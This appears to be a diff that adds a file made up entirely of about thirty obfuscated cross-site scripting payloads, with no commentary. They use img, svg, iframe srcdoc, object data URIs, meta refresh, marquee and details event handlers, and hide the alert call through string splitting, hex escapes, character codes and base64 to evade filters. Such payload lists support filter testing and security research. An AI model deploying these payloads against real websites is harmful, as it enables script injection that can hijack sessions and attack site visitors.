@@ -1,0 +1,31 @@
+```html
+<img src=x onerror=(window['al'+'ert'])(1)>
+<svg onload=window['al'+'ert']('XSS')>
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>">
+<object data=data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+>
+<marquee onstart=window['\\x61\\x6c\\x65\\x72\\x74'](1)>
+<svg><desc><![CDATA[<]]>script><![CDATA[>window['ale'+'rt'](1)<]]>/script><![CDATA[>]]></desc></svg>
+<details open ontoggle=window['\\x61\\x6c\\x65\\x72\\x74'](1)>
+<svg onload=Function('return ale'+'rt(1)')()>
+<meta http-equiv="refresh" content="0;url=javascript:window['al'+'ert']('XSS')">
+<iframe srcdoc="<img src=x onerror=eval('ale'+'rt(1)')>">
+<object type="text/html" data="javascript:window['al'+'ert'](1)">
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<marquee onstart=eval('String.fromCharCode(97,108,101,114,116,40,49,41)')>
+<iframe srcdoc="<svg onload=window['al'+'ert']('XSS')>">
+<meta http-equiv="refresh" content="0;url=javascript:eval('ale'+'rt(1)')">
+<img src=x onerror=Function('ale'+'rt(1)')()>
+<object data=data:text/html;base64,PHN2ZyBvbmxvYWQ9d2luZG93WydhbCsnZXJ0J10oMSk+>
+<details ontoggle=window['al'+'ert'](1) open>
+<svg><foreignObject><![CDATA[<]]>script><![CDATA[>window['ale'+'rt'](1)<]]>/script><![CDATA[>]]></foreignObject></svg>
+<marquee onstart=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<iframe srcdoc="<svg onload=Function('ale'+'rt(1)')()>">
+<meta http-equiv="refresh" content="0;url=javascript:window['\\x61\\x6c\\x65\\x72\\x74'](1)">
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<object type="text/html" data="javascript:eval('ale'+'rt(1)')">
+<svg onload=window['\\x61\\x6c\\x65\\x72\\x74']('XSS')>
+<details ontoggle=eval('String.fromCharCode(97,108,101,114,116,40,49,41)') open>
+<marquee onstart=Function('return ale'+'rt(1)')()>
+<iframe srcdoc="<img src=x onerror=window['al'+'ert'](1)>">
+<object data=data:text/html;base64,PHN2ZyBvbmxvYWQ9d2luZG93WydhbCsnZXJ0J10oMSk+>
+```
